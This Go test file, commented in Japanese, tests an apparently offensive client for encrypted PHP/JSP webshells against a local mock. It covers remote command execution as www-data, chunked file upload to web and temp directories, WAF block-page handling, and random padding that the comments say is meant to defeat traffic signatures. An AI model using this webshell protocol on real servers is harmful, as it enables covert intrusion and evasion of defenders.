package session

// http_shell_enc_test.go は暗号化シェル(phpenc/jspenc)の受け入れテスト: httptest で「模擬暗号化シェル
// サーバ」を立て、プロトコルどおりに暗号化/復号を実装する(ドライバの encCrypt/encDecrypt プリミティブを直接再利用し、
// 両者は互いの鏡像)。対象: GCM/CBC の両モード、probe/exec/分割 write+read のラウンドトリップ、ランダムパディングの
// 長さ分布、nonce の非重複、tag 改ざんの拒否、不正 base64(WAF ページ)のエラー意味論、誤った鍵、
// 404、Secret の復元。すべてプロトコル族レベルの模擬で、特定の検証環境の値は含まない。

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"io"
	"net/http"
	"strings"
	"sync"
	"testing"
)

// ---------------- 模擬暗号化シェルサーバ ----------------

// encMock は模擬シェル本体側: base64 暗号文を受け取り → 復号してフレームを剥がす → op で振り分け → 暗号化して返す。
// php が nil でない場合は phpenc の意味論(exec のコード片は phpMock.eval に渡す)、そうでなければ jspenc の
// 意味論(exec のコード片は sh コマンドで、fakeFS.run に渡す)。
type encMock struct {
	key  []byte
	mode string // gcm | cbc
	php  *phpMock
	fs   *fakeFS

	mu        sync.Mutex
	nonces    map[string]int
	padLens   []int
	tamperTag bool // 応答フレームの最終バイトを反転(tag 改ざんの模擬)
	garbage   bool // WAF のブロックページを返す(base64 でない)
	status    int  // >0 ならその HTTP ステータスを直接返す
}

func newEncMock(key []byte, mode string, php *phpMock) *encMock {
	m := &encMock{key: key, mode: mode, php: php, nonces: map[string]int{}}
	if php == nil {
		m.fs = newFakeFS()
	}
	return m
}

func (m *encMock) efs() *fakeFS {
	if m.php != nil {
		return m.php.fs
	}
	return m.fs
}

// reply はレスポンス JSON を暗号化して書き出す(tamper 時は最終バイトを反転して改ざんを模擬)。
func (m *encMock) reply(w http.ResponseWriter, resp encResponse, tamper bool) {
	praw, _ := json.Marshal(resp)
	blob, err := encCrypt(m.key, m.mode, encFrame(praw))
	if err != nil {
		w.WriteHeader(500)
		return
	}
	if tamper {
		blob[len(blob)-1] ^= 0xff
	}
	_, _ = io.WriteString(w, base64.StdEncoding.EncodeToString(blob))
}

func (m *encMock) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	m.mu.Lock()
	status, garbage, tamper := m.status, m.garbage, m.tamperTag
	m.mu.Unlock()
	if status > 0 {
		w.WriteHeader(status)
		return
	}
	if garbage {
		_, _ = io.WriteString(w, "<html><body>Request Blocked by WAF</body></html>")
		return
	}
	body, _ := io.ReadAll(r.Body)
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(string(body)))
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	nonceLen := encGCMNonce
	if m.mode == "cbc" {
		nonceLen = encCBCIV
	}
	if len(raw) < nonceLen+1 {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	m.mu.Lock()
	m.nonces[hex.EncodeToString(raw[:nonceLen])]++
	m.mu.Unlock()
	frame, err := encDecrypt(m.key, m.mode, raw)
	if err != nil {
		// 実際のシェル本体と同じく、復号失敗時は平文の詳細を返さず、暗号化したエラーフレームを返す
		// (ドライバの鍵が誤っているとこのフレームすら開けず tag エラーになる)。
		m.reply(w, encResponse{Err: "decrypt failed", Mode: m.mode}, false)
		return
	}
	if len(frame) == 0 {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	m.mu.Lock()
	m.padLens = append(m.padLens, int(frame[0]))
	m.mu.Unlock()
	payload, err := encUnframe(frame)
	if err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	var req encRequest
	if err := json.Unmarshal(payload, &req); err != nil {
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	m.reply(w, m.dispatch(&req), tamper)
}

func (m *encMock) dispatch(req *encRequest) encResponse {
	resp := encResponse{Mode: m.mode}
	switch req.Op {
	case "probe":
		resp.OK = true
		resp.Out = req.S
	case "exec":
		code, _ := base64.StdEncoding.DecodeString(req.Code)
		var out string
		if m.php != nil {
			out = m.php.eval(string(code)) // phpenc: PHP コード片を eval(フェーズ 1a の模擬を再利用)
		} else {
			out, _ = m.fs.run(string(code)) // jspenc:sh -c
		}
		resp.OK = true
		resp.Out = base64.StdEncoding.EncodeToString([]byte(out))
	case "read":
		p, _ := base64.StdEncoding.DecodeString(req.Path)
		data, ok := m.efs().readFile(string(p))
		if !ok {
			resp.Err = "read failed"
		} else {
			resp.OK = true
			resp.Out = base64.StdEncoding.EncodeToString(data)
		}
	case "write":
		p, _ := base64.StdEncoding.DecodeString(req.Path)
		d, _ := base64.StdEncoding.DecodeString(req.Data)
		m.efs().writeFile(string(p), d, req.App == "1")
		resp.OK = true
	default:
		resp.Err = "unknown op"
	}
	return resp
}

func randKey(t *testing.T) []byte {
	t.Helper()
	k := make([]byte, 32)
	if _, err := rand.Read(k); err != nil {
		t.Fatal(err)
	}
	return k
}

// ---------------- テスト ----------------

// TestEncPHPFullFlow: phpenc(GCM)の全経路。暗号化プローブ/関数列挙/Exec/分割書き込み・読み取りの往復。
func TestEncPHPFullFlow(t *testing.T) {
	key := randKey(t)
	mock := newEncMock(key, "gcm", newPHPMock("eval"))
	u := probeURL(t, mock)
	sh, info, err := ProbeEnc(context.Background(), u, "phpenc", base64.StdEncoding.EncodeToString(key))
	if err != nil {
		t.Fatalf("ProbeEnc: %v", err)
	}
	if info.Kind != "http_phpenc" || info.Lang != "phpenc" {
		t.Fatalf("kind/lang = %s/%s", info.Kind, info.Lang)
	}
	if len(info.Funcs) != 4 || info.Funcs[0] != "exec" {
		t.Fatalf("funcs = %v", info.Funcs)
	}
	stdout, _, err := sh.Exec(context.Background(), "id", 0)
	if err != nil {
		t.Fatalf("Exec: %v", err)
	}
	if !strings.Contains(stdout, "uid=33(www-data)") {
		t.Fatalf("stdout = %q", stdout)
	}
	// 分割書き込み・読み取りの往復(1.2MB → 3 ブロック)。
	data := make([]byte, 1_200_000)
	if _, err := rand.Read(data); err != nil {
		t.Fatal(err)
	}
	const path = "/var/www/uploads/payload.bin"
	if err := sh.WriteFile(context.Background(), path, data); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	got, err := sh.ReadFile(context.Background(), path)
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	if len(got) != len(data) {
		t.Fatalf("読み戻し長 = %d, want %d", len(got), len(data))
	}
	for i := range got {
		if got[i] != data[i] {
			t.Fatalf("第 %d バイトが不一致", i)
		}
	}
	// モードのラッチと Secret の永続化。
	sec := sh.Secret()
	if sec.Key == "" || sec.EncMode != "gcm" {
		t.Fatalf("secret = %+v, 鍵と gcm モードを持つべき", sec)
	}
}

// TestEncCBCModeFallback: 目標が CBC のみ(PHP に GCM がない場合のフォールバック経路)。ドライバはまず gcm を試して
// 失敗し、自動的に cbc をラッチする。以降は全経路が正常。
func TestEncCBCModeFallback(t *testing.T) {
	key := randKey(t)
	mock := newEncMock(key, "cbc", newPHPMock("eval"))
	u := probeURL(t, mock)
	sh, _, err := ProbeEnc(context.Background(), u, "phpenc", base64.StdEncoding.EncodeToString(key))
	if err != nil {
		t.Fatalf("ProbeEnc(cbc の目標): %v", err)
	}
	if sh.enc.Mode() != "cbc" {
		t.Fatalf("モードは cbc にラッチされるべき, got %q", sh.enc.Mode())
	}
	stdout, _, err := sh.Exec(context.Background(), "whoami", 0)
	if err != nil {
		t.Fatalf("Exec(cbc): %v", err)
	}
	if strings.TrimSpace(stdout) != "www-data" {
		t.Fatalf("stdout = %q", stdout)
	}
	if sec := sh.Secret(); sec.EncMode != "cbc" {
		t.Fatalf("EncMode = %q, want cbc", sec.EncMode)
	}
}

// TestEncNonceUniqueAndPadding: nonce はリクエストごとにランダムで重複しない。ランダムパディングの長さ分布が十分にある
// (固定長/前方一致のトラフィックシグネチャを無効化する直接の証拠)。
func TestEncNonceUniqueAndPadding(t *testing.T) {
	key := randKey(t)
	mock := newEncMock(key, "gcm", newPHPMock("eval"))
	u := probeURL(t, mock)
	sh, err := NewEncShell(u, "phpenc", base64.StdEncoding.EncodeToString(key))
	if err != nil {
		t.Fatal(err)
	}
	for i := 0; i < 100; i++ {
		if err := sh.Test(context.Background()); err != nil {
			t.Fatalf("Test の %d 回目: %v", i, err)
		}
	}
	mock.mu.Lock()
	requests := len(mock.padLens)
	distinctNonce := len(mock.nonces)
	distinct := map[int]bool{}
	for _, p := range mock.padLens {
		distinct[p] = true
		if p < 0 || p > encMaxPad {
			t.Errorf("padLen %d が範囲外", p)
		}
	}
	mock.mu.Unlock()
	if requests != 100 { // 100 回の Test(gcm が一発で成功し、ラッチ後の再送はない)
		t.Fatalf("リクエスト数 = %d, want 100", requests)
	}
	if distinctNonce != requests {
		t.Fatalf("nonce の重複: %d リクエストで異なる nonce は %d 個のみ", requests, distinctNonce)
	}
	if len(distinct) < 20 {
		t.Fatalf("パディング長の分布が狭すぎる: %d リクエストで padLen は %d 種のみ(0〜%d)", requests, len(distinct), encMaxPad)
	}
}

// TestEncTamperedTagRejected: レスポンスの tag が改ざんされたら必ず拒否し、成功を偽装しない。
func TestEncTamperedTagRejected(t *testing.T) {
	key := randKey(t)
	mock := newEncMock(key, "gcm", newPHPMock("eval"))
	u := probeURL(t, mock)
	sh, _, err := ProbeEnc(context.Background(), u, "phpenc", base64.StdEncoding.EncodeToString(key))
	if err != nil {
		t.Fatalf("ProbeEnc: %v", err)
	}
	mock.mu.Lock()
	mock.tamperTag = true
	mock.mu.Unlock()
	_, _, err = sh.Exec(context.Background(), "id", 0)
	if err == nil {
		t.Fatal("tag を改ざんした場合は必ずエラーになる")
	}
	if !strings.Contains(err.Error(), "認証") && !strings.Contains(err.Error(), "tag") {
		t.Fatalf("エラーは認証失敗の意味を持つべき, got %v", err)
	}
}

// TestEncGarbageResponseWAF: WAF のブロックページ(base64 でない)は明確なエラー意味論を持つこと。
func TestEncGarbageResponseWAF(t *testing.T) {
	key := randKey(t)
	mock := newEncMock(key, "gcm", newPHPMock("eval"))
	mock.garbage = true
	u := probeURL(t, mock)
	_, _, err := ProbeEnc(context.Background(), u, "phpenc", base64.StdEncoding.EncodeToString(key))
	if err == nil {
		t.Fatal("WAF ページでは必ずエラーになる")
	}
	if !strings.Contains(err.Error(), "base64") || !strings.Contains(err.Error(), "WAF") {
		t.Fatalf("エラーは WAF/非 base64 を識別するべき, got %v", err)
	}
}

// TestEncWrongKey: 鍵の不一致 → 認証失敗。成功を偽装しない。
func TestEncWrongKey(t *testing.T) {
	mock := newEncMock(randKey(t), "gcm", newPHPMock("eval"))
	u := probeURL(t, mock)
	wrong := randKey(t)
	_, _, err := ProbeEnc(context.Background(), u, "phpenc", base64.StdEncoding.EncodeToString(wrong))
	if err == nil {
		t.Fatal("誤った鍵では必ずエラーになる")
	}
	if !strings.Contains(err.Error(), "tag") && !strings.Contains(err.Error(), "認証") {
		t.Fatalf("エラーは tag/認証の意味を持つべき, got %v", err)
	}
}

// TestEncBadKeyFormat: base64 でない/32B でない鍵は構築時点で拒否する。
func TestEncBadKeyFormat(t *testing.T) {
	if _, err := NewEncShell("http://127.0.0.1/x.php", "phpenc", "not-base64!!!"); err == nil {
		t.Fatal("base64 でない鍵は拒否するべき")
	}
	if _, err := NewEncShell("http://127.0.0.1/x.php", "phpenc", base64.StdEncoding.EncodeToString([]byte("short"))); err == nil {
		t.Fatal("32B でない鍵は拒否するべき")
	}
}

// TestEncHTTP404: シェル本体が存在しない(404)場合は明確なエラーを返す。
func TestEncHTTP404(t *testing.T) {
	key := randKey(t)
	mock := newEncMock(key, "gcm", newPHPMock("eval"))
	mock.status = 404
	u := probeURL(t, mock)
	_, _, err := ProbeEnc(context.Background(), u, "phpenc", base64.StdEncoding.EncodeToString(key))
	if err == nil || !strings.Contains(err.Error(), "404") {
		t.Fatalf("404 はそのままエラーとして報告するべき, got %v", err)
	}
}

// TestEncJSPFullFlow: jspenc(GCM)の全経路。プローブ/Exec/shell 経路の分割書き込み・読み取りの往復。
func TestEncJSPFullFlow(t *testing.T) {
	key := randKey(t)
	mock := newEncMock(key, "gcm", nil) // php == nil → jspenc の意味論
	u := probeURL(t, mock)
	sh, info, err := ProbeEnc(context.Background(), u, "jspenc", base64.StdEncoding.EncodeToString(key))
	if err != nil {
		t.Fatalf("ProbeEnc: %v", err)
	}
	if info.Kind != "http_jspenc" || info.Lang != "jspenc" {
		t.Fatalf("kind/lang = %s/%s", info.Kind, info.Lang)
	}
	stdout, _, err := sh.Exec(context.Background(), "id", 0)
	if err != nil {
		t.Fatalf("Exec: %v", err)
	}
	if !strings.Contains(stdout, "uid=33(www-data)") {
		t.Fatalf("stdout = %q", stdout)
	}
	data := make([]byte, 600_000) // 2 ブロック
	if _, err := rand.Read(data); err != nil {
		t.Fatal(err)
	}
	const path = "/tmp/agent.bin"
	if err := sh.WriteFile(context.Background(), path, data); err != nil {
		t.Fatalf("WriteFile: %v", err)
	}
	got, err := sh.ReadFile(context.Background(), path)
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	if len(got) != len(data) {
		t.Fatalf("読み戻し長 = %d, want %d", len(got), len(data))
	}
	for i := range got {
		if got[i] != data[i] {
			t.Fatalf("第 %d バイトが不一致", i)
		}
	}
}

// TestEncRestoreRoundTrip: Secret を DB に保存 → プロセス再起動後に復元(再プローブしない)→ そのまま利用可能。
// モードは EncMode から復元される(二重送信での再プローブが不要)。
func TestEncRestoreRoundTrip(t *testing.T) {
	key := randKey(t)
	mock := newEncMock(key, "cbc", newPHPMock("eval"))
	u := probeURL(t, mock)
	sh, _, err := ProbeEnc(context.Background(), u, "phpenc", base64.StdEncoding.EncodeToString(key))
	if err != nil {
		t.Fatalf("ProbeEnc: %v", err)
	}
	sh.SetID(7)
	sec := sh.Secret()
	got, err := RestoreHTTPShell(7, sec)
	if err != nil {
		t.Fatalf("Restore: %v", err)
	}
	if got.ID() != 7 || got.Kind() != "http_phpenc" {
		t.Fatalf("id/kind = %d/%s", got.ID(), got.Kind())
	}
	if got.enc.Mode() != "cbc" {
		t.Fatalf("復元後のモード = %q, want cbc(再プローブ不要)", got.enc.Mode())
	}
	stdout, _, err := got.Exec(context.Background(), "whoami", 0)
	if err != nil {
		t.Fatalf("復元後の Exec: %v", err)
	}
	if strings.TrimSpace(stdout) != "www-data" {
		t.Fatalf("stdout = %q", stdout)
	}
}

// TestEncPKCS7RoundTrip: CBC パディングプリミティブの自己整合性(満ブロック境界を含む)。
func TestEncPKCS7RoundTrip(t *testing.T) {
	for _, n := range []int{1, 15, 16, 17, 64, 65} {
		p := make([]byte, n)
		if _, err := rand.Read(p); err != nil {
			t.Fatal(err)
		}
		got, err := pkcs7Unpad(pkcs7Pad(p, 16), 16)
		if err != nil {
			t.Fatalf("n=%d: %v", n, err)
		}
		if len(got) != n {
			t.Fatalf("n=%d の往復後長 = %d", n, len(got))
		}
		for i := range got {
			if got[i] != p[i] {
				t.Fatalf("n=%d 第 %d バイトが不一致", n, i)
			}
		}
	}
}
